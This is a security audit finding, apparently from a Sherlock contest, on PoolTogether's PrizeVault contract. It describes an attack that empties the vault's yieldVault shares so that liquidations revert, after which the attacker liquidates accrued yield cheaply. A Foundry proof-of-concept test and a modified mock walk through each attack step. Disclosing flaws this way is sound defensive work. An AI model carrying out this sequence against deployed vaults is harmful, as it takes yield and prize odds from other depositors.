Creamy Ginger Salamander

high

# An attacker can force a prizeVault into a state to delay liquidations for a greater profit

## Summary
An attacker can force a prizeVault into a state to delay liquidations for a greater profit 

## Vulnerability Detail
`transferTokensOut` is function that will always be called in the liquidation flow

```solidity
function transferTokensOut(
        address /* sender */,
        address _receiver,
        address _tokenOut,
        uint256 _amountOut
    ) external virtual onlyLiquidationPair returns (bytes memory) {
        if (_amountOut == 0) revert LiquidationAmountOutZero();

        uint256 _totalDebtBefore = totalDebt();
        uint256 _availableYield = _availableYieldBalance(totalPreciseAssets(), _totalDebtBefore);
        ...
        ...
```

The **vulnerability** is the use of `totalPreciseAssets` in the calculation of `_availableYield `

If the amount of yieldVault shares held by the prizeVault = 0, then `totalPreciseAssets` will revert since `yieldVault.previewRedeem(yieldVault.balanceOf(address(this)))` will revert.

An attacker can take advantage of this by liquidating a large amount of yield and then withdrawing their deposit to enter the required state where amount of yieldVault shares held by the prizeVault = 0. 

At this point liquidations will revert due to the reasons previously mentioned 

An attacker can then wait for some time and then deposit to increase yieldVault shares and then liquidate at a very cheap price since it is done via a Dutch auction

## Impact
The attacker has effectively stolen the yield from other users.

The attacker has reduced the chances of winning for all other users of that vault.

Users of the vault will have a lower likelihood of winning a prize

## Proof of concept
Replace the existing `BaseIntegration.t.sol` in /2024-05-pooltogether/pt-v5-vault/test/integration/BaseIntegration.t.sol with the following 

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

import { IERC20, IERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";

import { PrizePool } from "pt-v5-prize-pool/PrizePool.sol";
import { TwabController } from "pt-v5-twab-controller/TwabController.sol";

import { ERC20PermitMock } from "../contracts/mock/ERC20PermitMock.sol";
import { PrizePoolMock } from "../contracts/mock/PrizePoolMock.sol";
import { Permit } from "../contracts/utility/Permit.sol";

import { PrizeVaultWrapper, PrizeVault } from "../contracts/wrapper/PrizeVaultWrapper.sol";

import { YieldVault } from "../contracts/mock/YieldVault.sol";

abstract contract BaseIntegration is Test, Permit {

    /* ============ events ============ */

    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event ClaimerSet(address indexed claimer);
    event LiquidationPairSet(address indexed tokenOut, address indexed liquidationPair);
    event YieldFeeRecipientSet(address indexed yieldFeeRecipient);
    event YieldFeePercentageSet(uint256 yieldFeePercentage);
    event MockContribute(address prizeVault, uint256 amount);
    event ClaimYieldFeeShares(address indexed recipient, uint256 shares);
    event TransferYieldOut(address indexed liquidationPair, address indexed tokenOut, address indexed recipient, uint256 amountOut, uint256 yieldFee);
    event Sponsor(address indexed caller, uint256 assets, uint256 shares);

    /* ============ variables ============ */

    address public vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
    address public attacker = 0xEf57e88a27f8958D72fd9F983D28349374e6C110;

    address internal owner;
    uint256 internal ownerPrivateKey;

    address internal alice;
    uint256 internal alicePrivateKey;

    address internal bob;
    uint256 internal bobPrivateKey;

    PrizeVaultWrapper public prizeVault;
    string public vaultName = "PoolTogether Test Vault";
    string public vaultSymbol = "pTest";
    uint256 public yieldBuffer = 1e5;

    IERC4626 public yieldVault;
    ERC20PermitMock public underlyingAsset;
    uint8 public assetDecimals;
    uint256 public approxAssetUsdExchangeRate;
    ERC20PermitMock public prizeToken;

    address public claimer;
    PrizePoolMock public prizePool;

    uint32 public drawPeriodSeconds = 1 days;
    TwabController public twabController;

    /// @dev A low gas estimate of what it would cost in gas to manipulate the state into losing 1 wei of assets
    /// in a rounding error. (This should be a unachievable low estimate such that an attacker would never be able
    /// to cause repeated rounding errors for less).
    uint256 lowGasEstimateForStateChange = 100_000;

    /// @dev A low gas price estimate for the chain.
    uint256 lowGasPriceEstimate = 7 gwei;

    /// @dev Defined in 1e18 precision. (2e18 would be 2 ETH per USD)
    uint256 approxEthUsdExchangeRate = uint256(1e18) / uint256(3000); // approx 1 ETH for $3000

    /// @dev Override to true if vault is not expected to have yield
    bool ignoreYield = false;

    /// @dev Override to true if vault cannot feasibly lose assets
    bool ignoreLoss = false;

    /// @dev Some yield vaults have predictable precision loss (such as Sonne which reduces precision of assets with their exchange rate).
    /// This optional variable can be set if this precision loss is acknowledged and appropriate countermeasures will be taken (ex. deploying
    /// a PrizeVault with a higher yield buffer to match the reduced precision).
    uint8 assetPrecisionLoss = 0;

    /* ============ setup ============ */

    function setUpUnderlyingAsset() public virtual returns (IERC20 asset, uint8 decimals, uint256 approxAssetUsdExchangeRate);

    function setUpYieldVault() public virtual returns (IERC4626) {
        return new YieldVault(
            address(underlyingAsset),
            "Test Yield Vault",
            "yvTest"
        );
    }

    function setUpFork() public virtual;

    function beforeSetup() public virtual;

    function afterSetup() public virtual;

    function setUp() public virtual {
        beforeSetup();

        (owner, ownerPrivateKey) = makeAddrAndKey("Owner");
        (alice, alicePrivateKey) = makeAddrAndKey("Alice");
        (bob, bobPrivateKey) = makeAddrAndKey("Bob");

        underlyingAsset = new ERC20PermitMock("SHIBE");

        yieldVault = setUpYieldVault();

        

        prizeToken = new ERC20PermitMock("POOL");

        twabController = new TwabController(1 hours, uint32(block.timestamp));

        prizePool = new PrizePoolMock(prizeToken, twabController);

        claimer = address(0xe291d9169F0316272482dD82bF297BB0a11D267f);

        // adjust yield buffer based-on mitigated precision loss
        yieldBuffer = 1e5 * (10 ** assetPrecisionLoss);

        prizeVault = new PrizeVaultWrapper(
            vaultName,
            vaultSymbol,
            yieldVault,
            PrizePool(address(prizePool)),
            claimer,
            bob,
            0,
            yieldBuffer, // yield buffer
            address(this)
        );
        prizeVault.setLiquidationPair(address(this));

        // Fill yield buffer if non-zero:
        if (yieldBuffer > 0) {
            dealAssets(address(prizeVault), yieldBuffer);
        }

        afterSetup();
    }

    /* ============ prank helpers ============ */

    address private currentPrankee;

    /// @notice should be used instead of vm.startPrank so we can keep track of pranks within other pranks
    function startPrank(address prankee) public {
        currentPrankee = prankee;
        vm.startPrank(prankee);
    }

    /// @notice should be used instead of vm.stopPrank so we can keep track of pranks within other pranks
    function stopPrank() public {
        currentPrankee = address(0);
        vm.stopPrank();
    }

    /// @notice pranks the address and sets the prank back to the msg sender at the end
    modifier prankception(address prankee) {
        address prankBefore = currentPrankee;
        vm.stopPrank();
        vm.startPrank(prankee);
        _;
        vm.stopPrank();
        if (prankBefore != address(0)) {
            vm.startPrank(prankBefore);
        }
    }

    /* ============ helpers to override ============ */

    /// @dev The max amount of assets than can be dealt.
    function maxDeal() public virtual returns (uint256);

    /// @dev May revert if the amount requested exceeds the amount available to deal.
    function dealAssets(address to, uint256 amount) public virtual;

    /// @dev Some yield sources accrue by time, so it's difficult to accrue an exact amount. Call the 
    /// function multiple times if the test requires the accrual of more yield than the default amount.
    function _accrueYield() internal virtual;

    /// @dev Simulates loss on the yield vault such that the value of it's shares drops
    function _simulateLoss() internal virtual;

    /// @dev Each integration test must override the `_accrueYield` internal function for this to work.
    function accrueYield() public returns (uint256) {
        uint256 assetsBefore = prizeVault.totalPreciseAssets();
        _accrueYield();
        uint256 assetsAfter = prizeVault.totalPreciseAssets();
        if (yieldVault.balanceOf(address(prizeVault)) > 0) {
            // if the prize vault has any yield vault shares, check to ensure yield has accrued
            require(assetsAfter > assetsBefore, "yield did not accrue");
        } else {
            if (underlyingAsset.balanceOf(address(prizeVault)) > 0) {
                // the underlying asset might be rebasing in some setups, so it's possible time passing has caused an increase in latent balance
                require(assetsAfter >= assetsBefore, "assets decreased while holding latent balance");
            } else {
                // otherwise, we should expect no change on the prize vault
                require(assetsAfter == assetsBefore, "assets changed with zero yield shares");
            }
        }
        return assetsAfter - assetsBefore;
    }

    function checkIgnoreYield() internal returns (bool) {
        if (ignoreYield) {
            console2.log("skipping test since yield is ignored...");
            return true;
        }
        return false;
    }

    /// @dev Each integration test must override the `_simulateLoss` internal function for this to work.
    /// @return The loss the prize vault has incurred as a result of yield vault loss (if any)
    function simulateLoss() public returns (uint256) {
        uint256 assetsBefore = prizeVault.totalPreciseAssets();
        _simulateLoss();
        uint256 assetsAfter = prizeVault.totalPreciseAssets();
        if (yieldVault.balanceOf(address(prizeVault)) > 0) {
            // if the prize vault has any yield vault shares, check to ensure some loss has occurred
            require(assetsAfter < assetsBefore, "loss not simulated");
        } else {
            if (underlyingAsset.balanceOf(address(prizeVault)) > 0) {
                // the underlying asset might be rebasing in some setups, so it's possible time passing has caused an increase in latent balance
                require(assetsAfter >= assetsBefore, "assets decreased while holding latent balance");
                return 0;
            } else {
                // otherwise, we should expect no change on the prize vault
                require(assetsAfter == assetsBefore, "assets changed with zero yield shares");
            }
        }
        return assetsBefore - assetsAfter;
    }

    function checkIgnoreLoss() internal returns (bool) {
        if (ignoreLoss) {
            console2.log("skipping test since loss is ignored...");
            return true;
        }
        return false;
    }

    /* ============ Integration Test Scenarios ============ */

    //////////////////////////////////////////////////////////
    /// Basic Asset Tests
    //////////////////////////////////////////////////////////

    /// @dev Tests if the asset meets a minimum precision per dollar (PPD). If the asset
    /// is below this PPD, then it is possible that the yield buffer will not be able to sustain
    /// the rounding errors that will accrue on deposits and withdrawals.
    ///
    /// Also passes if the yield buffer is zero (no buffer is needed if rounding errors are impossible).
    function testAssetPrecisionMeetsMinimum() public {
        if (yieldBuffer > 0) {
            uint256 minimumPPD = 1e6; // USDC is the benchmark (6 decimals represent $1 of value)
            uint256 assetPPD = (1e18 * (10 ** (assetDecimals - assetPrecisionLoss))) / approxAssetUsdExchangeRate;
            assertGe(assetPPD, minimumPPD, "asset PPD > minimum PPD");
        }
    }

    /// @notice Test if the attacker can cause rounding error loss on the prize vault by spending
    /// less in gas than the rounding error loss will cost the vault.
    ///
    /// @dev This is an important measure to test since it's possible that some yield vaults can essentially
    /// rounding errors to other holders of yield vault shares. If an attacker can cheaply cause repeated
    /// rounding errors on the prize vault, they can potentially profit by being a majority shareholder on
    /// the underlying yield vault.
    function testAssetRoundingErrorManipulationCost() public {
        uint256 costToManipulateInEth = lowGasPriceEstimate * lowGasEstimateForStateChange;
        uint256 costToManipulateInUsd = (costToManipulateInEth * 1e18) / approxEthUsdExchangeRate;
        uint256 costOfRoundingErrorInUsd = ((10 ** assetPrecisionLoss) * 1e18) / approxAssetUsdExchangeRate;
        // 10x threshold is set so an attacker would have to spend at least 10x the loss they can cause on the prize vault.
        uint256 multiplierThreshold = 10;
        assertLt(costOfRoundingErrorInUsd * multiplierThreshold, costToManipulateInUsd, "attacker can cheaply cause rounding errors");
    }

    //////////////////////////////////////////////////////////
    /// Deposit Tests
    //////////////////////////////////////////////////////////

    /// @notice test deposit
    function testDeposit() public {
        uint256 amount = 10 ** assetDecimals;
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
        uint256 totalSupplyBefore = prizeVault.totalSupply();

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        stopPrank();

        uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
        uint256 totalSupplyAfter = prizeVault.totalSupply();

        assertEq(prizeVault.balanceOf(alice), amount, "shares minted");
        assertApproxEqAbs(
            totalAssetsBefore + amount,
            totalAssetsAfter,
            10 ** assetPrecisionLoss,
            "assets accounted for with possible rounding error"
        );
        assertEq(totalSupplyBefore + amount, totalSupplyAfter, "supply increased by amount");
    }

    /// @notice test multi-user deposit
    function testMultiDeposit() public {
        address[] memory depositors = new address[](3);
        depositors[0] = alice;
        depositors[1] = bob;
        depositors[2] = address(this);

        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 amount = (10 ** assetDecimals) * (i + 1);
            uint256 maxAmount = maxDeal() / 2;
            if (amount > maxAmount) amount = maxAmount;
            dealAssets(depositors[i], amount);

            uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
            uint256 totalSupplyBefore = prizeVault.totalSupply();

            startPrank(depositors[i]);
            underlyingAsset.approve(address(prizeVault), amount);
            prizeVault.deposit(amount, depositors[i]);
            stopPrank();

            uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
            uint256 totalSupplyAfter = prizeVault.totalSupply();

            assertEq(prizeVault.balanceOf(depositors[i]), amount, "shares minted");
            assertApproxEqAbs(
                totalAssetsBefore + amount,
                totalAssetsAfter,
                10 ** assetPrecisionLoss,
                "assets accounted for with possible rounding error"
            );
            assertEq(totalSupplyBefore + amount, totalSupplyAfter, "supply increased by amount");
        }
    }

    /// @notice test multi-user deposit w/yield accrual in between
    function testMultiDepositWithYieldAccrual() public {
        if (checkIgnoreYield()) return;

        address[] memory depositors = new address[](2);
        depositors[0] = alice;
        depositors[1] = bob;

        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 amount = (10 ** assetDecimals) * (i + 1);
            uint256 maxAmount = maxDeal() / 2;
            if (amount > maxAmount) amount = maxAmount;
            dealAssets(depositors[i], amount);

            uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
            uint256 totalSupplyBefore = prizeVault.totalSupply();

            startPrank(depositors[i]);
            underlyingAsset.approve(address(prizeVault), amount);
            prizeVault.deposit(amount, depositors[i]);
            stopPrank();

            uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
            uint256 totalSupplyAfter = prizeVault.totalSupply();

            assertEq(prizeVault.balanceOf(depositors[i]), amount, "shares minted");
            assertApproxEqAbs(
                totalAssetsBefore + amount,
                totalAssetsAfter,
                10 ** assetPrecisionLoss,
                "assets accounted for with possible rounding error"
            );
            assertEq(totalSupplyBefore + amount, totalSupplyAfter, "supply increased by amount");

            if (i == 0) {
                // accrue yield
                accrueYield();
            }
        }
    }

    //////////////////////////////////////////////////////////
    /// Withdrawal Tests
    //////////////////////////////////////////////////////////

    /// @notice test withdraw
    /// @dev also tests for any active deposit / withdraw fees
    function testWithdraw() public {
        uint256 amount = 10 ** assetDecimals;
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
        uint256 totalSupplyBefore = prizeVault.totalSupply();

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        prizeVault.withdraw(amount, alice, alice);
        stopPrank();

        uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
        uint256 totalSupplyAfter = prizeVault.totalSupply();

        assertEq(prizeVault.balanceOf(alice), 0, "burns all user shares on full withdraw");
        assertEq(underlyingAsset.balanceOf(alice), amount, "withdraws full amount of assets");
        assertApproxEqAbs(
            totalAssetsBefore,
            totalAssetsAfter,
            2 * 10 ** assetPrecisionLoss,
            "no assets missing except for possible rounding error"
        ); // 1 possible rounding error for deposit, 1 for withdraw
        assertEq(totalSupplyBefore, totalSupplyAfter, "supply same as before");
    }

    /// @notice test withdraw with yield accrual
    function testWithdrawWithYieldAccrual() public {
        if (checkIgnoreYield()) return;

        uint256 amount = 10 ** assetDecimals;
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
        uint256 totalSupplyBefore = prizeVault.totalSupply();

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        uint256 yield = accrueYield(); // accrue yield in between
        prizeVault.withdraw(amount, alice, alice);
        stopPrank();

        uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
        uint256 totalSupplyAfter = prizeVault.totalSupply();

        assertEq(prizeVault.balanceOf(alice), 0, "burns all user shares on full withdraw");
        assertEq(underlyingAsset.balanceOf(alice), amount, "withdraws full amount of assets");
        assertApproxEqAbs(
            totalAssetsBefore + yield,
            totalAssetsAfter,
            2 * 10 ** assetPrecisionLoss,
            "no assets missing except for possible rounding error"
        ); // 1 possible rounding error for deposit, 1 for withdraw
        assertEq(totalSupplyBefore, totalSupplyAfter, "supply same as before");
    }

    /// @notice test all users withdraw
    function testWithdrawAllUsers() public {
        address[] memory depositors = new address[](3);
        depositors[0] = alice;
        depositors[1] = bob;
        depositors[2] = address(this);

        uint256[] memory amounts = new uint256[](3);

        // deposit
        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 amount = (10 ** assetDecimals) * (i + 1);
            uint256 maxAmount = maxDeal() / 2;
            if (amount > maxAmount) amount = maxAmount;
            amounts[i] = amount;
            dealAssets(depositors[i], amount);

            startPrank(depositors[i]);
            underlyingAsset.approve(address(prizeVault), amount);
            prizeVault.deposit(amount, depositors[i]);
            stopPrank();
        }

        // withdraw
        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
            uint256 totalSupplyBefore = prizeVault.totalSupply();

            startPrank(depositors[i]);
            prizeVault.withdraw(amounts[i], depositors[i], depositors[i]);
            stopPrank();

            uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
            uint256 totalSupplyAfter = prizeVault.totalSupply();

            assertEq(prizeVault.balanceOf(depositors[i]), 0, "burned all user's shares on withdraw");
            assertEq(underlyingAsset.balanceOf(depositors[i]), amounts[i], "withdrew full asset amount for user");
            assertApproxEqAbs(
                totalAssetsBefore,
                totalAssetsAfter + amounts[i],
                10 ** assetPrecisionLoss,
                "assets accounted for with no more than 1 wei rounding error"
            );
            assertEq(totalSupplyBefore - amounts[i], totalSupplyAfter, "total supply decreased by amount");
        }
    }

    /// @notice test all users withdraw during lossy state
    function testWithdrawAllUsersWhileLossy() public {
        if (checkIgnoreLoss()) return;

        address[] memory depositors = new address[](3);
        depositors[0] = alice;
        depositors[1] = bob;
        depositors[2] = address(this);

        // deposit
        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 amount = (10 ** assetDecimals) * (i + 1);
            uint256 maxAmount = maxDeal() / 2;
            if (amount > maxAmount) amount = maxAmount;
            dealAssets(depositors[i], amount);

            startPrank(depositors[i]);
            underlyingAsset.approve(address(prizeVault), amount);
            prizeVault.deposit(amount, depositors[i]);
            stopPrank();
        }

        // cause loss on the yield vault
        simulateLoss();

        // ensure prize vault is in lossy state
        assertLt(prizeVault.totalPreciseAssets(), prizeVault.totalDebt());

        // verify all users can withdraw a proportional amount of assets
        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 shares = prizeVault.balanceOf(depositors[i]);
            uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
            uint256 totalSupplyBefore = prizeVault.totalSupply();
            uint256 totalDebtBefore = prizeVault.totalDebt();
            uint256 expectedAssets = (shares * totalAssetsBefore) / totalDebtBefore;

            startPrank(depositors[i]);
            uint256 assets = prizeVault.redeem(shares, depositors[i], depositors[i]);
            stopPrank();

            uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
            uint256 totalSupplyAfter = prizeVault.totalSupply();

            assertEq(assets, expectedAssets, "assets received proportional to shares / totalDebt");
            assertEq(prizeVault.balanceOf(depositors[i]), 0, "burned all user's shares on withdraw");
            assertEq(underlyingAsset.balanceOf(depositors[i]), assets, "withdrew assets for user");
            assertApproxEqAbs(
                totalAssetsBefore,
                totalAssetsAfter + assets,
                10 ** assetPrecisionLoss,
                "assets accounted for with no more than 1 wei rounding error"
            );
            assertEq(totalSupplyBefore - shares, totalSupplyAfter, "total supply decreased by shares");
        }
    }

    /// @notice test liquidation of assets
    function testAssetLiquidation() public {
        if (checkIgnoreYield()) return;

        // Deposit
        uint256 amount = 1000 * (10 ** assetDecimals);
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        stopPrank();

        // Yield Accrual
        uint256 approxYield = accrueYield();
        uint256 availableYield = prizeVault.availableYieldBalance();
        assertApproxEqAbs(
            approxYield,
            availableYield,
            10 ** assetPrecisionLoss,
            "approx yield equals available yield balance"
        );
        uint256 availableAssets = prizeVault.liquidatableBalanceOf(address(underlyingAsset));
        assertGt(availableAssets, 0, "assets are available for liquidation");
        
        // Liquidate
        prizeVault.transferTokensOut(address(0), bob, address(underlyingAsset), availableAssets);
        assertEq(underlyingAsset.balanceOf(bob), availableAssets, "liquidator is transferred expected assets");
        assertApproxEqAbs(prizeVault.availableYieldBalance(), availableYield - availableAssets, 10 ** assetPrecisionLoss, "available yield decreased (w / 1 wei rounding error)");
        assertApproxEqAbs(prizeVault.liquidatableBalanceOf(address(underlyingAsset)), 0, 10 ** assetPrecisionLoss, "no more assets can be liquidated (w/ 1 wei rounding error)");
    }

    /// @notice test liquidatable balance of when lossy
    function testNoLiquidationWhenLossy() public {
        if (checkIgnoreYield() || checkIgnoreLoss()) return;

        // Deposit
        uint256 amount = 1000 * (10 ** assetDecimals);
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        stopPrank();

        // Yield Accrual
        uint256 approxYield = accrueYield();
        uint256 availableYield = prizeVault.availableYieldBalance();
        assertApproxEqAbs(
            approxYield,
            availableYield,
            10 ** assetPrecisionLoss,
            "approx yield equals available yield balance"
        );
        uint256 availableAssets = prizeVault.liquidatableBalanceOf(address(underlyingAsset));
        assertGt(availableAssets, 0, "assets are available for liquidation");
        uint256 availableShares = prizeVault.liquidatableBalanceOf(address(prizeVault));
        assertGt(availableShares, 0, "shares are available for liquidation");

        // Loss Occurs
        simulateLoss();

        // No liquidations can occur if assets < debt
        availableYield = prizeVault.availableYieldBalance();
        assertEq(availableYield, 0, "no available yield after loss");
        availableAssets = prizeVault.liquidatableBalanceOf(address(underlyingAsset));
        assertEq(availableAssets, 0, "no available asset liquidation after loss");
        availableShares = prizeVault.liquidatableBalanceOf(address(prizeVault));
        assertEq(availableShares, 0, "no available share liquidation after loss");
    }
    
}

```

</details>



Update the yieldVault MOCK so it is more realistic with the sanity check

Find it in /2024-05-pooltogether/pt-v5-vault/test/contracts/mock/YieldVault.sol

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { ERC4626Mock } from "openzeppelin/mocks/ERC4626Mock.sol";
import { Math } from "openzeppelin/utils/math/Math.sol";

contract YieldVault is ERC4626Mock {
    using Math for uint256;

    constructor(address _asset, string memory _name, string memory _symbol) ERC4626Mock(_asset) {}

    /**
     * We override the virtual shares and assets implementation since this approach captures
     * a very small part of the yield being accrued, which offsets by 1 wei
     * the withdrawable amount from the YieldVault and skews our unit tests equality comparisons.
     * Read this comment in the OpenZeppelin documentation to understand why:
     * https://github.com/openzeppelin/openzeppelin-contracts/blob/eedca5d873a559140d79cc7ec674d0e28b2b6ebd/contracts/token/ERC20/extensions/ERC4626.sol#L30
     */
    // function _convertToShares(
    //     uint256 assets,
    //     Math.Rounding rounding
    // ) internal view virtual override returns (uint256) {
    //     uint256 supply = totalSupply();
    //     return (assets == 0 || supply == 0) ? assets : assets.mulDiv(supply, totalAssets(), rounding);
    // }

    // function _convertToAssets(
    //     uint256 shares,
    //     Math.Rounding rounding
    // ) internal view virtual override returns (uint256) {
    //     uint256 supply = totalSupply();
    //     return (shares == 0 || supply == 0) ? shares : shares.mulDiv(totalAssets(), supply, rounding);
    // }

    function previewRedeem(uint256 shares) public view virtual override returns (uint256) {
        require(shares > 0, "Shares must be greater than 0");
        return super.previewRedeem(shares);
    }


}

```

</details>

Now add the following ComplexLiquidationAttack.sol to /2024-05-pooltogether/pt-v5-vault/test/integration/ComplexLiquidationAttack.sol

The following foundry test test__ComplexLiquidationAttack() illustrates the attack scenario.

Run it with the following command line input

```terminal
forge test --mt test__ComplexLiquidationAttack -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";
import { BaseIntegration } from "./BaseIntegration.t.sol";



import { IERC20, IERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";

import { PrizePool } from "pt-v5-prize-pool/PrizePool.sol";
import { TwabController } from "pt-v5-twab-controller/TwabController.sol";

import { ERC20PermitMock } from "../contracts/mock/ERC20PermitMock.sol";
import { PrizePoolMock } from "../contracts/mock/PrizePoolMock.sol";
import { Permit } from "../contracts/utility/Permit.sol";

import { PrizeVaultWrapper, PrizeVault } from "../contracts/wrapper/PrizeVaultWrapper.sol";

import { YieldVault } from "../contracts/mock/YieldVault.sol";

contract ComplexLiquidationAttack is Test, BaseIntegration {
    function setUp() override public {
        super.setUp();


        // Setup users
        underlyingAsset.mint(alice, type(uint128).max);
        vm.startPrank(alice);
        underlyingAsset.approve(address(prizeVault), type(uint128).max);

        underlyingAsset.mint(bob, type(uint128).max);
        vm.startPrank(bob);
        underlyingAsset.approve(address(prizeVault), type(uint128).max);

        underlyingAsset.mint(attacker, type(uint128).max);
        vm.startPrank(attacker);
        underlyingAsset.approve(address(prizeVault), type(uint128).max);

        underlyingAsset.mint(vitalik, type(uint128).max);
        vm.startPrank(vitalik);
        underlyingAsset.approve(address(prizeVault), type(uint128).max);
    }

    function setUpUnderlyingAsset() public override returns (IERC20 asset, uint8 decimals, uint256 approxAssetUsdExchangeRate) {}

    function setUpFork() public override {}

    function beforeSetup() public override {}

    function afterSetup() public override {}

    /* ============ helpers to override ============ */

    /// @dev The max amount of assets than can be dealt.
    function maxDeal() public override returns (uint256) {}

    /// @dev May revert if the amount requested exceeds the amount available to deal.
    function dealAssets(address to, uint256 amount) public override {}

    /// @dev Some yield sources accrue by time, so it's difficult to accrue an exact amount. Call the 
    /// function multiple times if the test requires the accrual of more yield than the default amount.
    function _accrueYield() internal override {
        vm.startPrank(alice);
        IERC20(underlyingAsset).transfer(address(yieldVault), 10000000);
    }

    /// @dev Simulates loss on the yield vault such that the value of it's shares drops
    function _simulateLoss() internal override {}





    function test__ComplexLiquidationAttack() public {

        // Multiple users deposit into the vault
        vm.startPrank(alice);
        prizeVault.deposit(10e6, alice);

        vm.startPrank(attacker);
        prizeVault.deposit(10e6, attacker);

        vm.startPrank(vitalik);
        prizeVault.deposit(10e6, vitalik);

        console.log("Total YieldVault shares owned by PrizeVault after deposits =", yieldVault.balanceOf(address(prizeVault)));

        // The attacker directly transfers yield into the yieldVault
        vm.startPrank(attacker);
        underlyingAsset.transfer(address(yieldVault), 700000000e6);

        // The attacker immediately liquidates the yield for a minimal amount of prizeTokens (since the amount of yield does not influence the price)
        vm.stopPrank();
        prizeVault.transferTokensOut(address(0), bob, address(underlyingAsset), prizeVault.liquidatableBalanceOf(address(underlyingAsset)));

        console.log("Total YieldVault shares owned by PrizeVault after liquidation =", yieldVault.balanceOf(address(prizeVault)));

        // The attacker calls withdraw(), this will redeem the last yieldVault share      
        vm.startPrank(attacker);
        prizeVault.withdraw(prizeVault.balanceOf(attacker), attacker, attacker);

        // This shows there are no more yieldVault shares left
        console.log("Total YieldVault shares owned by PrizeVault after attacker withdraws =", yieldVault.balanceOf(address(prizeVault)));

        // Yield Accrual
        vm.startPrank(alice);
        underlyingAsset.transfer(address(yieldVault), 10000);


        // When a honest user tries to liquidate it will revert
        vm.stopPrank();
        vm.expectRevert("Shares must be greater than 0");
        prizeVault.transferTokensOut(address(0), bob, address(underlyingAsset), 10000);

        //Attacker waits for a few days to make the liquidation cheap
        skip(3 days);
        
        // Attacker deposits to mint yieldVault shares
        vm.startPrank(attacker);
        prizeVault.deposit(1000e6, attacker);
        console.log("Total YieldVault shares owned by PrizeVault after attacker deposits again =", yieldVault.balanceOf(address(prizeVault)));

        // Yield Accrual 
        vm.startPrank(alice);
        underlyingAsset.transfer(address(yieldVault), 100000);

        // Attacker backruns the deposit with a liquidation for a great profit
        vm.stopPrank();
        prizeVault.transferTokensOut(address(0), bob, address(underlyingAsset), 100);




    }



        

}
```

## Code Snippet
https://github.com/sherlock-audit/2024-05-pooltogether/blob/1aa1b8c028b659585e4c7a6b9b652fb075f86db3/pt-v5-vault/src/PrizeVault.sol#L723

## Tool used

Manual Review

## Recommendation
Possibly using `_tryGetTotalPreciseAssets` in the calcualtion of `_availableYield`, I did not have the time to verify if this works / is foolproof
